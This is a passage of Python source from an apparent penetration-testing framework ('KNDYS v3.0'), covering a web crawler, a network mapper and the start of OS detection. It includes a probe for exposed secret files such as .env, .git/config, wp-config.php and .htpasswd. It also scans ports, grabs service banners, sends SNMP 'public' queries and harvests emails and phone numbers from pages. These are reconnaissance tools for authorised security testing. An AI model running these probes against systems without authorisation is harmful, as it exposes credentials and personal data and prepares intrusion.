            print(f"{Fore.RED}[!] Vulnerabilities detected: {len(results['vulnerabilities'])}{Style.RESET_ALL}")
            for vuln in results['vulnerabilities'][:5]:
                print(f" {Fore.YELLOW}- {vuln['type']} ({vuln['severity']}) on {vuln.get('url', 'unknown')}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] Crawl completed in {elapsed:.2f}s{Style.RESET_ALL}\n")
        self._export_crawler_results(url, results, elapsed)
    
    def _check_robots_txt(self, url):
        """Parse robots.txt for disallowed entries"""
        disallowed = []
        robots_url = urljoin(url, '/robots.txt')
        try:
            response = requests.get(robots_url, timeout=5, verify=False)
            if response.status_code == 200:
                for line in response.text.splitlines():
                    line = line.strip()
                    if line.lower().startswith('disallow:'):
                        path = line.split(':', 1)[1].strip()
                        if path and path not in disallowed:
                            disallowed.append(path)
        except Exception:
            pass
        return disallowed

    def _detect_technologies(self, response, soup):
        """Fingerprint technologies via headers and HTML"""
        technologies = []
        server = response.headers.get('Server')
        powered = response.headers.get('X-Powered-By')
        if server:
            technologies.append(f"Server: {server}")
        if powered:
            technologies.append(f"Powered-By: {powered}")
        for meta in soup.find_all('meta'):
            if meta.get('name', '').lower() == 'generator':
                technologies.append(f"Generator: {meta.get('content', '')}")
        signatures = {
            'WordPress': ['wp-content', 'wp-includes'],
            'Drupal': ['drupal', 'sites/all'],
            'Joomla': ['com_content', 'joomla'],
            'Django': ['csrfmiddlewaretoken'],
            'Flask': ['werkzeug'],
            'Laravel': ['laravel', 'csrf-token'],
            'React': ['react', 'react-dom'],
            'Vue.js': ['vue.js', '__vue__'],
            'Angular': ['ng-app', 'angular.js'],
            'jQuery': ['jquery'],
            'Bootstrap': ['bootstrap.css', 'bootstrap.js']
        }
        text_blob = soup.get_text().lower()
        for tech, hints in signatures.items():
            if any(hint.lower() in text_blob for hint in hints) and tech not in technologies:
                technologies.append(tech)
        return technologies

    def _analyze_security_headers(self, headers):
        audit = {}
        required = [
            'X-Frame-Options', 'X-Content-Type-Options', 'X-XSS-Protection',
            'Strict-Transport-Security', 'Content-Security-Policy',
            'Referrer-Policy', 'Permissions-Policy'
        ]
        for header in required:
            audit[header] = headers.get(header, 'Missing')
        return audit

    def _analyze_cookies(self, cookies):
        report = []
        for cookie in cookies:
            report.append({
                'name': cookie.name,
                'value': cookie.value[:25] + '...' if len(cookie.value) > 25 else cookie.value,
                'domain': cookie.domain,
                'secure': cookie.secure,
                'httponly': cookie.has_nonstandard_attr('HttpOnly')
            })
        return report

    def _extract_forms(self, soup, url, scan_vulns):
        forms = []
        vulnerabilities = []
        for form in soup.find_all('form'):
            data = {
                'url': url,
                'action': form.get('action', ''),
                'method': form.get('method', 'get').upper(),
                'inputs': []
            }
            has_csrf = False
            for tag in form.find_all(['input', 'textarea', 'select']):
                input_meta = {
                    'name': tag.get('name', ''),
                    'type': tag.get('type', 'text'),
                    'value': tag.get('value', ''),
                    'required': tag.has_attr('required')
                }
                data['inputs'].append(input_meta)
                if any(token in (tag.get('name', '') or '').lower() for token in ['csrf', 'token', '_token']):
                    has_csrf = True
                if scan_vulns and tag.get('type', '').lower() == 'password':
                    autocomplete = tag.get('autocomplete', '').lower()
                    if autocomplete not in ['off', 'new-password']:
                        vulnerabilities.append({
                            'type': 'Password Autocomplete Enabled',
                            'severity': 'Low',
                            'description': f"Password field '{tag.get('name', '')}' allows autocomplete",
                            'url': url
                        })
            if scan_vulns and data['method'] == 'POST' and not has_csrf:
                vulnerabilities.append({
                    'type': 'Missing CSRF Protection',
                    'severity': 'Medium',
                    'description': 'POST form without CSRF token detected',
                    'url': url
                })
            forms.append(data)
        return forms, vulnerabilities

    def _extract_files(self, soup, base_url, files):
        documents = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.csv']
        for link in soup.find_all('a', href=True):
            href = link['href']
            if any(ext in href.lower() for ext in documents):
                full = urljoin(base_url, href)
                if full not in files['documents']:
                    files['documents'].append(full)
        for img in soup.find_all('img', src=True):
            full = urljoin(base_url, img['src'])
            if full not in files['images']:
                files['images'].append(full)
        for script in soup.find_all('script', src=True):
            full = urljoin(base_url, script['src'])
            if full not in files['scripts']:
                files['scripts'].append(full)
        for css in soup.find_all('link', rel='stylesheet', href=True):
            full = urljoin(base_url, css['href'])
            if full not in files['stylesheets']:
                files['stylesheets'].append(full)
        for media in soup.find_all(['audio', 'video'], src=True):
            full = urljoin(base_url, media['src'])
            if full not in files['media']:
                files['media'].append(full)

    def _extract_emails(self, text):
        return re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)

    def _extract_phones(self, text):
        patterns = [
            r'\+?\d{1,3}[\s.-]?\(?\d{1,4}\)?[\s.-]?\d{3}[\s.-]?\d{4}',
            r'\(\d{3}\)\s*\d{3}-\d{4}',
            r'\d{3}-\d{3}-\d{4}'
        ]
        numbers = []
        for pattern in patterns:
            numbers.extend(re.findall(pattern, text))
        return numbers

    def _extract_parameters(self, page_url):
        params = set()
        parsed = urlparse(page_url)
        if parsed.query:
            for chunk in parsed.query.split('&'):
                if '=' in chunk:
                    params.add(chunk.split('=')[0])
        return params

    def _extract_comments(self, soup, url):
        notes = []
        for node in soup.find_all(string=lambda s: isinstance(s, str) and '<!--' in s):
            snippet = node.strip()
            if len(snippet) > 10:
                notes.append({'url': url, 'comment': snippet[:200]})
        return notes

    def _extract_js_endpoints(self, text):
        endpoints = []
        patterns = [
            r'["\'](/(?:api|v1|v2|v3)/[a-zA-Z0-9/_-]+)["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.(?:get|post|put|delete|patch)\(["\']([^"\']+)["\']',
            r'\$.ajax\([^)]*url\s*:\s*["\']([^"\']+)["\']'
        ]
        for pattern in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                endpoint = match.strip('\"\'')
                if endpoint and endpoint not in endpoints:
                    endpoints.append(endpoint)
        return endpoints

    def _probe_sensitive_files(self, base_url, session=None, timeout=3.0, max_workers=5):
        candidates = [
            '.git/config', '.git/HEAD', '.svn/entries', '.env', '.env.local', '.env.production',
            'config.php', 'wp-config.php', 'web.config', '.htaccess', '.htpasswd',
            'composer.json', 'package.json', 'yarn.lock', 'package-lock.json',
            'backup.zip', 'backup.sql', 'database.sql', 'db.sql', 'dump.sql',
            'phpinfo.php', 'info.php', 'test.php', 'admin/', 'phpmyadmin/',
            'README.md', 'CHANGELOG.md', 'LICENSE', '.DS_Store', 'desktop.ini'
        ]
        found = []
        session = session or requests.Session()

        def check_path(path):
            candidate = urljoin(base_url, path)
            try:
                resp = session.head(candidate, timeout=timeout, verify=False, allow_redirects=True)
                if resp.status_code == 200:
                    return candidate
            except Exception:
                return None
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(check_path, path) for path in candidates]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result and result not in found:
                    found.append(result)
        return found

    def _export_crawler_results(self, url, results, elapsed):
        timestamp = int(time.time())
        domain = urlparse(url).netloc.replace(':', '_')
        json_file = f'crawler_{domain}_{timestamp}.json'
        data = {
            'url': url,
            'timestamp': timestamp,
            'duration': elapsed,
            'statistics': {
                'pages_crawled': len(results['pages']),
                'links_found': len(results['links']),
                'forms_found': len(results['forms']),
                'emails': len(results['emails']),
                'phone_numbers': len(results['phone_numbers']),
                'js_endpoints': len(results['js_endpoints']),
                'sensitive_files': len(results['sensitive_files']),
                'vulnerabilities': len(results['vulnerabilities'])
            },
            'pages': results['pages'],
            'links': results['links'],
            'forms': results['forms'],
            'files': results['files'],
            'emails': results['emails'],
            'phone_numbers': results['phone_numbers'],
            'js_endpoints': results['js_endpoints'],
            'api_endpoints': results['api_endpoints'],
            'parameters': results['parameters'],
            'sensitive_files': results['sensitive_files'],
            'technologies': results['technologies'],
            'security_headers': results['security_headers'],
            'cookies': results['cookies'],
            'vulnerabilities': results['vulnerabilities'],
            'comments': results['comments']
        }
        with open(json_file, 'w', encoding='utf-8') as fh:
            json.dump(data, fh, indent=2)
        txt_file = f'crawler_{domain}_{timestamp}_report.txt'
        with open(txt_file, 'w', encoding='utf-8') as fh:
            fh.write("=" * 70 + "\n")
            fh.write("WEB CRAWLER REPORT - KNDYS v3.0\n")
            fh.write("=" * 70 + "\n\n")
            fh.write(f"Target: {url}\n")
            fh.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}\n")
            fh.write(f"Duration: {elapsed:.2f}s\n\n")
            fh.write("Statistics:\n")
            for key, value in data['statistics'].items():
                fh.write(f" • {key.replace('_', ' ').title()}: {value}\n")
            if results['technologies']:
                fh.write("\nTechnologies:\n")
                for tech in results['technologies']:
                    fh.write(f" • {tech}\n")
            if results['sensitive_files']:
                fh.write("\nSensitive Files:\n")
                for item in results['sensitive_files']:
                    fh.write(f" • {item}\n")
            if results['vulnerabilities']:
                fh.write("\nVulnerabilities:\n")
                for vuln in results['vulnerabilities']:
                    fh.write(f" [{vuln['severity']}] {vuln['type']} - {vuln.get('url', 'n/a')}\n")
                    fh.write(f" {vuln['description']}\n")
            if results['api_endpoints']:
                fh.write("\nAPI Endpoints:\n")
                for endpoint in results['api_endpoints'][:25]:
                    fh.write(f" • {endpoint}\n")
        print(f"{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
        print(f" • {json_file}")
        print(f" • {txt_file}")

    def run_network_mapper(self):
        """Advanced network discovery with OS, service, and topology analysis"""
        network = self.module_options['network']
        scan_type = self.module_options.get('scan_type', 'ping').lower()
        resolve_hostnames = self.module_options.get('resolve_hostnames', 'true').lower() == 'true'
        detect_os = self.module_options.get('detect_os', 'true').lower() == 'true'
        service_detection = self.module_options.get('service_detection', 'false').lower() == 'true'
        topology_map = self.module_options.get('topology_map', 'false').lower() == 'true'
        try:
            timeout = max(0.5, float(self.module_options.get('timeout', '1')))
        except (TypeError, ValueError):
            timeout = 1.0
        try:
            max_workers = max(1, min(int(self.module_options.get('max_workers', '30')), 200))
        except (TypeError, ValueError):
            max_workers = 30

        if scan_type not in {'ping', 'tcp', 'udp', 'all'}:
            scan_type = 'ping'
        use_icmp = scan_type in ('ping', 'all')
        use_tcp = scan_type in ('tcp', 'all')
        use_udp = scan_type in ('udp', 'all')

        print(f"{Fore.CYAN}╔{'═'*70}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{' '*18}ADVANCED NETWORK MAPPER - KNDYS v3.0{' '*18}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═'*70}╝{Style.RESET_ALL}\n")

        try:
            net = ipaddress.ip_network(network, strict=False)
        except ValueError as exc:
            print(f"{Fore.RED}[!] Invalid network: {exc}{Style.RESET_ALL}")
            return

        host_list = list(net.hosts())
        if not host_list:
            host_list = [net.network_address]
        total_hosts = len(host_list)

        print(f"{Fore.CYAN}[*] Network: {net}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Scan Type: {scan_type} | Timeout: {timeout:.1f}s | Workers: {max_workers}{Style.RESET_ALL}")
        option_line = []
        if resolve_hostnames:
            option_line.append('Hostname Resolution')
        if detect_os:
            option_line.append('OS Detection')
        if service_detection:
            option_line.append('Service Detection')
        if topology_map:
            option_line.append('Topology Map')
        options_text = ', '.join(option_line) if option_line else 'None'
        print(f"{Fore.CYAN}[*] Options: {options_text}{Style.RESET_ALL}\n")
        print(f"{Fore.BLUE}[*] Scanning {total_hosts} addresses...{Style.RESET_ALL}")

        start_time = time.time()
        hosts_data = {}
        detection_methods_used = set()
        scanned_hosts = 0
        live_hosts = 0

        def worker(ip_obj):
            ip_str = str(ip_obj)
            try:
                return self._scan_network_host(
                    ip_str,
                    use_icmp=use_icmp,
                    use_tcp=use_tcp,
                    use_udp=use_udp,
                    timeout=timeout,
                    detect_os=detect_os,
                    resolve_hostnames=resolve_hostnames,
                    service_detection=service_detection
                )
            except Exception:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_map = {executor.submit(worker, ip): str(ip) for ip in host_list}
            for future in concurrent.futures.as_completed(future_map):
                scanned_hosts += 1
                result = None
                try:
                    result = future.result()
                except Exception as exc:
                    print(f"{Fore.RED}\n[-] Worker error for {future_map[future]}: {exc}{Style.RESET_ALL}")
                if result and result.get('status') == 'up':
                    hosts_data[result['ip']] = result
                    live_hosts += 1
                    detection_methods_used.update(result.get('detection_methods', []))
                    host_label = result['hostnames'][0] if result['hostnames'] else 'unknown'
                    latency = result['latency'] if result['latency'] is not None else 0.0
                    os_guess = result['os_guess'] or 'Unknown'
                    device = result['device_type'] or 'Unknown'
                    print(f"{Fore.GREEN} {result['ip']} ({host_label}) [{latency:.2f}ms] - {os_guess} - {device}{Style.RESET_ALL}")
                    if result['open_ports']:
                        ports_line = ', '.join(str(port) for port in result['open_ports'])
                        print(f" {Fore.CYAN}↳ Open ports: {ports_line}{Style.RESET_ALL}")
                    if result.get('udp_ports'):
                        ports_line = ', '.join(f"{p}/udp" for p in result['udp_ports'])
                        print(f" {Fore.CYAN}↳ UDP services: {ports_line}{Style.RESET_ALL}")
                    if result['services']:
                        for port_key, svc in sorted(result['services'].items(), key=lambda item: item[0]):
                            banner = svc.get('banner', '')
                            detail = f" - {banner[:80]}" if banner else ''
                            print(f" {Fore.YELLOW}• {port_key}/{svc.get('name', 'Service')}{detail}{Style.RESET_ALL}")
                if scanned_hosts % 25 == 0:
                    print(f"{Fore.BLUE}[*] Progress: {scanned_hosts}/{total_hosts} hosts, {live_hosts} live{Style.RESET_ALL}", end='\r')

        elapsed = time.time() - start_time
        hosts_per_second = (scanned_hosts / elapsed) if elapsed else 0.0
        print()
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}NETWORK MAP SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Hosts scanned: {scanned_hosts}/{total_hosts}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Live hosts: {live_hosts}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Duration: {elapsed:.2f}s | Hosts/sec: {hosts_per_second:.2f}{Style.RESET_ALL}")

        if not hosts_data:
            print(f"{Fore.YELLOW}[!] No live hosts detected{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}[*] Live host details:{Style.RESET_ALL}")
            for ip in sorted(hosts_data.keys(), key=lambda addr: ipaddress.ip_address(addr)):
                info = hosts_data[ip]
                host_label = info['hostnames'][0] if info['hostnames'] else 'unknown'
                os_guess = info['os_guess'] or 'Unknown'
                device = info['device_type'] or 'Unknown'
                latency = info['latency'] if info['latency'] is not None else 0.0
                print(f"{Fore.GREEN} {ip} ({host_label}) [{latency:.2f}ms] - {os_guess} - {device}{Style.RESET_ALL}")
                if info['open_ports']:
                    ports_line = ', '.join(str(port) for port in info['open_ports'])
                    print(f" {Fore.CYAN}↳ Open ports: {ports_line}{Style.RESET_ALL}")
                if info.get('udp_ports'):
                    ports_line = ', '.join(f"{p}/udp" for p in info['udp_ports'])
                    print(f" {Fore.CYAN}↳ UDP services: {ports_line}{Style.RESET_ALL}")
                if info['services']:
                    for port_key, svc in sorted(info['services'].items(), key=lambda item: item[0]):
                        banner = svc.get('banner', '')
                        detail = f" - {banner[:80]}" if banner else ''
                        print(f" {Fore.YELLOW}• {port_key}/{svc.get('name', 'Service')}{detail}{Style.RESET_ALL}")

        network_info = {
            'network': str(net),
            'total_addresses': total_hosts,
            'network_address': str(net.network_address),
            'broadcast_address': str(net.broadcast_address),
            'netmask': str(net.netmask),
            'prefix_length': net.prefixlen,
            'hosts_scanned': scanned_hosts,
            'live_hosts': live_hosts
        }

        topology = self._build_topology(hosts_data) if topology_map else {}
        statistics = {
            'total_hosts_scanned': scanned_hosts,
            'live_hosts_found': live_hosts,
            'scan_time': elapsed,
            'hosts_per_second': hosts_per_second,
            'scan_type': scan_type,
            'detection_methods': sorted(detection_methods_used)
        }

        self._export_network_map(str(net), hosts_data, network_info, topology, statistics)

    def _scan_network_host(self, ip, use_icmp, use_tcp, use_udp, timeout, detect_os, resolve_hostnames, service_detection):
        host_info = {
            'ip': ip,
            'status': 'down',
            'method': None,
            'latency': None,
            'ttl': None,
            'os_guess': None,
            'hostnames': [],
            'open_ports': [],
            'udp_ports': [],
            'services': {},
            'device_type': None,
            'device_confidence': None,
            'mac': None,
            'mac_vendor': None,
            'detection_methods': []
        }

        detection_methods = []
        best_latency = None
        ttl_value = None

        if use_icmp:
            latency, ttl = self._icmp_ping(ip, timeout)
            if latency is not None:
                detection_methods.append('icmp')
                best_latency = latency
                ttl_value = ttl
                host_info['status'] = 'up'
                host_info['method'] = 'icmp'
                host_info['latency'] = latency
                host_info['ttl'] = ttl

        if use_tcp:
            tcp_result = self._scan_tcp_ports(ip, timeout, service_detection)
            if tcp_result['open_ports']:
                detection_methods.append('tcp')
                if host_info['status'] != 'up':
                    host_info['status'] = 'up'
                    host_info['method'] = 'tcp'
                if tcp_result['latency'] is not None and (best_latency is None or tcp_result['latency'] < best_latency):
                    best_latency = tcp_result['latency']
                    host_info['latency'] = tcp_result['latency']
                host_info['open_ports'] = tcp_result['open_ports']
                host_info['services'].update(tcp_result['services'])
            else:
                host_info['open_ports'] = []
        if use_udp:
            udp_ports, udp_services = self._probe_udp_services(ip, timeout)
            if udp_ports:
                detection_methods.append('udp')
                if host_info['status'] != 'up':
                    host_info['status'] = 'up'
                    host_info['method'] = host_info['method'] or 'udp'
                host_info['udp_ports'] = udp_ports
                host_info['services'].update(udp_services)
        else:
            host_info['udp_ports'] = []

        if host_info['status'] != 'up':
            return None

        if resolve_hostnames:
            host_info['hostnames'] = self._resolve_hostnames_safe(ip)
        if detect_os:
            if ttl_value:
                host_info['os_guess'] = self._guess_os_from_ttl(ttl_value)
            elif host_info['open_ports']:
                host_info['os_guess'] = self._guess_os_from_ports(host_info['open_ports'])
        host_info['device_type'], host_info['device_confidence'] = self._classify_device(
            host_info['hostnames'],
            host_info['open_ports'],
            host_info['udp_ports'],
            host_info.get('os_guess')
        )
        host_info['latency'] = best_latency if best_latency is not None else host_info['latency']
        host_info['detection_methods'] = sorted(set(detection_methods))
        if not host_info['os_guess']:
            host_info['os_guess'] = 'Unknown'
        return host_info

    def _icmp_ping(self, ip, timeout):
        param_count = '-n' if os.name == 'nt' else '-c'
        param_timeout = '-w' if os.name == 'nt' else '-W'
        timeout_value = str(max(1, int(timeout * 1000))) if os.name == 'nt' else str(max(1, int(timeout)))
        command = ['ping', param_count, '1', param_timeout, timeout_value, ip]
        start = time.time()
        try:
            result = subprocess.run(command, capture_output=True, text=True, timeout=timeout + 1)
        except Exception:
            return None, None
        if result.returncode != 0:
            return None, None
        output = result.stdout.lower()
        latency = None
        ttl = None
        latency_match = re.search(r'time[=<]\s*([0-9.]+)\s*ms', output)
        ttl_match = re.search(r'ttl[=:\s]([0-9]+)', output)
        if latency_match:
            latency = float(latency_match.group(1))
        else:
            latency = (time.time() - start) * 1000
        if ttl_match:
            ttl = int(ttl_match.group(1))
        return latency, ttl

    def _scan_tcp_ports(self, ip, timeout, service_detection):
        common_ports = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS', 80: 'HTTP',
            110: 'POP3', 143: 'IMAP', 161: 'SNMP', 389: 'LDAP', 443: 'HTTPS', 445: 'SMB',
            465: 'SMTPS', 587: 'SMTP Submission', 593: 'RPC over HTTP', 631: 'IPP',
            8080: 'HTTP Alt', 8443: 'HTTPS Alt', 8888: 'HTTP Alt', 9060: 'HP iLO',
            9100: 'Printer', 10443: 'HTTPS Alt', 1433: 'MSSQL', 1521: 'Oracle', 1723: 'PPTP',
            1883: 'MQTT', 27017: 'MongoDB', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
            554: 'RTSP', 5900: 'VNC', 5985: 'WinRM', 6379: 'Redis', 8000: 'HTTP Alt'
        }
        open_ports = []
        services = {}
        best_latency = None

        for port, name in common_ports.items():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            start = time.time()
            try:
                result = sock.connect_ex((ip, port))
                if result == 0:
                    latency = (time.time() - start) * 1000
                    if best_latency is None or latency < best_latency:
                        best_latency = latency
                    banner = ''
                    if service_detection:
                        banner = self._grab_service_banner(sock, ip, port, timeout)
                    open_ports.append(port)
                    services[str(port)] = {
                        'name': name,
                        'banner': banner[:200]
                    }
                else:
                    continue
            except Exception:
                continue
            finally:
                sock.close()
        return {
            'open_ports': sorted(open_ports),
            'services': services,
            'latency': best_latency
        }

    def _grab_service_banner(self, sock, ip, port, timeout):
        try:
            sock.settimeout(timeout)
            if port in {80, 8000, 8080, 8443, 8888}:
                request = f"HEAD / HTTP/1.0\r\nHost: {ip}\r\nUser-Agent: {self.config['user_agent']}\r\nConnection: close\r\n\r\n"
                sock.sendall(request.encode())
            elif port in {25, 110, 143, 465, 587, 993, 995}:
                pass # banners usually sent automatically
            elif port == 21:
                pass
            elif port == 22:
                pass
            data = sock.recv(200)
            return data.decode(errors='ignore').strip()
        except Exception:
            return ''

    def _probe_udp_services(self, ip, timeout):
        udp_ports = {
            53: ('DNS', b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"),
            123: ('NTP', b"\x1b" + b"\x00" * 47),
            161: ('SNMP', b"\x30\x26\x02\x01\x00\x04\x06public\xa0\x19\x02\x04\x71\xb7\xdb\x68\x02\x01\x00\x02\x01\x00\x30\x0b\x30\t\x06\x05+\x06\x01\x02\x01\x05\x00"),
            67: ('DHCP', os.urandom(48))
        }
        responsive = []
        services = {}

        for port, (name, payload) in udp_ports.items():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            try:
                sock.sendto(payload, (ip, port))
                data, _ = sock.recvfrom(200)
                responsive.append(port)
                try:
                    banner = data.decode(errors='ignore').strip()
                except Exception:
                    banner = data.hex()
                services[f"{port}/udp"] = {
                    'name': f"{name} (UDP)",
                    'banner': banner[:200]
                }
            except socket.timeout:
                pass
            except Exception:
                pass
            finally:
                sock.close()
        return sorted(responsive), services

    def _resolve_hostnames_safe(self, ip):
        try:
            hostname, aliases, _ = socket.gethostbyaddr(ip)
            hostnames = [hostname]
            for alias in aliases:
                if alias not in hostnames:
                    hostnames.append(alias)
            return hostnames
        except Exception:
            return []

    def _guess_os_from_ttl(self, ttl):
        if ttl is None:
            return None
        if ttl <= 64:
            return f"Linux/Unix (TTL: {ttl})"
        if ttl <= 128:
            return f"Windows (TTL: {ttl})"
        if ttl <= 255:
            return f"Network Device (TTL: {ttl})"
        return f"Unknown (TTL: {ttl})"

    def _guess_os_from_ports(self, ports):
        port_set = set(ports)
        if 3389 in port_set or 445 in port_set:
            return 'Windows (heuristic)'
        if 22 in port_set and 80 in port_set:
            return 'Linux/Unix (heuristic)'
        return 'Unknown'

    def _classify_device(self, hostnames, open_ports, udp_ports, os_guess):
        hostname = hostnames[0].lower() if hostnames else ''
        open_set = set(open_ports)
        udp_set = set(udp_ports)
        os_guess = (os_guess or '').lower()
        device = 'Unknown'
        confidence = 'Low'

        def score_device(condition, label, base_score):
            nonlocal device, confidence
            if condition:
                scores = {'High': 3, 'Medium': 2, 'Low': 1}
                if scores[base_score] >= scores.get(confidence, 0):
                    confidence = base_score
                    device = label

        score_device(('router' in hostname or 'gateway' in hostname or 'gw' in hostname) and (161 in open_set or 443 in open_set), 'Router', 'High')
        score_device(('switch' in hostname) and 161 in open_set, 'Switch', 'High')
        score_device(('firewall' in hostname or 'pfsense' in hostname) or (443 in open_set and 10443 in open_set), 'Firewall', 'Medium')
        score_device(9100 in open_set or 'printer' in hostname, 'Printer', 'High')
        score_device(3306 in open_set or 5432 in open_set or 1433 in open_set, 'Database Server', 'Medium')
        score_device(25 in open_set or 587 in open_set or 110 in open_set or 143 in open_set, 'Mail Server', 'Medium')
        score_device((80 in open_set or 443 in open_set or 8080 in open_set) and 'linux' in os_guess, 'Web Server', 'Medium')
        score_device(22 in open_set and 'linux' in os_guess, 'Linux Server', 'Medium')
        score_device((445 in open_set or 3389 in open_set) and 'windows' in os_guess, 'Windows Host', 'Medium')
        score_device(161 in open_set or 161 in udp_set, 'SNMP Device', 'Low')
        score_device(1883 in open_set, 'IoT Gateway', 'Low')

        return device, confidence

    def _build_topology(self, hosts):
        topology = {
            'potential_gateways': [],
            'device_groups': {},
            'os_distribution': {},
            'service_distribution': {}
        }
        for ip, data in hosts.items():
            device = data.get('device_type') or 'Unknown'
            topology['device_groups'].setdefault(device, []).append(ip)
            os_guess = data.get('os_guess') or 'Unknown'
            topology['os_distribution'][os_guess] = topology['os_distribution'].get(os_guess, 0) + 1
            for svc in data.get('services', {}).values():
                name = svc.get('name') or 'Service'
                topology['service_distribution'][name] = topology['service_distribution'].get(name, 0) + 1
            open_ports = set(data.get('open_ports', []))
            if device in {'Router', 'Firewall'} or 161 in open_ports:
                topology['potential_gateways'].append(ip)
        topology['potential_gateways'] = sorted(set(topology['potential_gateways']), key=lambda addr: ipaddress.ip_address(addr))
        for key in ('device_groups', 'service_distribution', 'os_distribution'):
            topology[key] = dict(sorted(topology[key].items(), key=lambda item: item[0]))
        return topology

    def _export_network_map(self, network, hosts, network_info, topology, statistics):
        timestamp = int(time.time())
        safe_network = network.replace('/', '_')
        json_file = f'network_map_{safe_network}_{timestamp}.json'
        data = {
            'network': network,
            'timestamp': timestamp,
            'hosts': hosts,
            'network_info': network_info,
            'topology': topology,
            'statistics': statistics
        }
        with open(json_file, 'w', encoding='utf-8') as fh:
            json.dump(data, fh, indent=2)

        txt_file = f'network_map_{safe_network}_{timestamp}_report.txt'
        with open(txt_file, 'w', encoding='utf-8') as fh:
            fh.write("=" * 78 + "\n")
            fh.write("NETWORK MAPPING REPORT - KNDYS FRAMEWORK\n")
            fh.write("=" * 78 + "\n\n")
            fh.write(f"Network: {network}\n")
            fh.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}\n")
            fh.write(f"Duration: {statistics['scan_time']:.2f}s\n")
            fh.write(f"Hosts Scanned: {statistics['total_hosts_scanned']}\n")
            fh.write(f"Live Hosts: {statistics['live_hosts_found']}\n\n")

            fh.write("Network Information:\n")
            fh.write("-" * 78 + "\n")
            for key, value in network_info.items():
                fh.write(f" {key}: {value}\n")
            fh.write("\n")

            fh.write(f"Live Hosts ({statistics['live_hosts_found']}):\n")
            fh.write("-" * 78 + "\n")
            for ip in sorted(hosts.keys(), key=lambda addr: ipaddress.ip_address(addr)):
                info = hosts[ip]
                fh.write(f"IP: {ip}\n")
                if info['hostnames']:
                    fh.write(f" Hostname: {info['hostnames'][0]}\n")
                fh.write(f" Latency: {info['latency']:.2f}ms\n" if info['latency'] else " Latency: n/a\n")
                fh.write(f" OS: {info.get('os_guess', 'Unknown')}\n")
                fh.write(f" Device Type: {info.get('device_type', 'Unknown')} (Confidence: {info.get('device_confidence', 'Low')})\n")
                if info['open_ports']:
                    fh.write(f" Open Ports: {', '.join(str(p) for p in info['open_ports'])}\n")
                if info.get('udp_ports'):
                    fh.write(f" UDP Services: {', '.join(f'{p}/udp' for p in info['udp_ports'])}\n")
                if info['services']:
                    fh.write(" Services:\n")
                    for port_key, svc in sorted(info['services'].items(), key=lambda item: item[0]):
                        banner = svc.get('banner') or ''
                        if banner:
                            fh.write(f" - {port_key}/{svc.get('name', 'Service')}: {banner[:100]}\n")
                        else:
                            fh.write(f" - {port_key}/{svc.get('name', 'Service')}\n")
                fh.write("\n")

            if topology:
                fh.write("Topology Analysis:\n")
                fh.write("-" * 78 + "\n")
                fh.write(f"Potential Gateways: {', '.join(topology.get('potential_gateways', [])) or 'None'}\n")
                fh.write("\nDevice Groups:\n")
                for device, members in topology.get('device_groups', {}).items():
                    fh.write(f" {device}: {len(members)} hosts\n")
                fh.write("\nOS Distribution:\n")
                for os_name, count in topology.get('os_distribution', {}).items():
                    fh.write(f" {os_name}: {count}\n")
                fh.write("\nService Distribution:\n")
                for svc_name, count in topology.get('service_distribution', {}).items():
                    fh.write(f" {svc_name}: {count}\n")

        print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
        print(f" • {json_file}")
        print(f" • {txt_file}")
    
    def run_os_detection(self):
        """Advanced multi-factor OS detection with fingerprint scoring"""
        target = self.module_options['target']
        deep_scan = self.module_options.get('deep_scan', 'false').lower() == 'true'
        port_scan = self.module_options.get('port_scan', 'true').lower() == 'true'
        banner_grab = self.module_options.get('banner_grab', 'true').lower() == 'true'
        timing = self.module_options.get('timing', 'normal').lower()
        custom_ports = self.module_options.get('custom_ports', '')
        try:
            max_ports = max(1, min(int(self.module_options.get('max_ports', '60')), 200))
        except (TypeError, ValueError):
            max_ports = 60

        timing_profile = self._get_timing_profile(timing)
        print(f"{Fore.CYAN}╔{'═'*70}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{' '*18}ADVANCED OS DETECTION - KNDYS v3.0{' '*18}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═'*70}╝{Style.RESET_ALL}\n")
        print(f"{Fore.CYAN}[*] Target: {target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Timing: {timing.upper()} (timeout {timing_profile['timeout']:.1f}s, retries {timing_profile['retries']}){Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Options: Port Scan={port_scan} | Deep Scan={deep_scan} | Banner Grab={banner_grab}{Style.RESET_ALL}\n")

        start_time = time.time()
        timestamp = int(start_time)
        ports_scanned = []
        port_results = []
